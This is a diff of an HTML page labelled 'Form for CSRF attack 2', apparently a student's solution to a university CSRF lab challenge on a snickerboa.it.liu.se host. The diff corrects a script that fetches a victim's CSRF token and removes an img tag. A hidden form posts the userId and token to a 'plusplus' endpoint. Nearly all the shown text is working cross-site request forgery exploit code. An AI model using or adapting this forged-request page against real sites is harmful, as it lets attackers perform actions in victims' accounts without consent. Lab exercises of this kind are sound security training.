@@ -14,7 +14,7 @@ body {font-family: "Lato", sans-serif}
 
 <!-- Form for CSRF attack 2-->  
 <script>
-  var xhr = XMLHttpRequest();
+  var xhr = new XMLHttpRequest();
   xhr.open('GET', "https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=9460e602519f36d858ac6bda083d9de3587ee33e", false);
   xhr.send();
 
@@ -24,7 +24,6 @@ body {font-family: "Lato", sans-serif}
   }
 </script>
 
-<img src="https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=9460e602519f36d858ac6bda083d9de3587ee33e" />
 <form name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus" method="POST">
   <input type="hidden" name="userId" value="9460e602519f36d858ac6bda083d9de3587ee33e" />
   <input type="hidden" name="csrfToken" value=-157626038139579470091380137775474574365 />
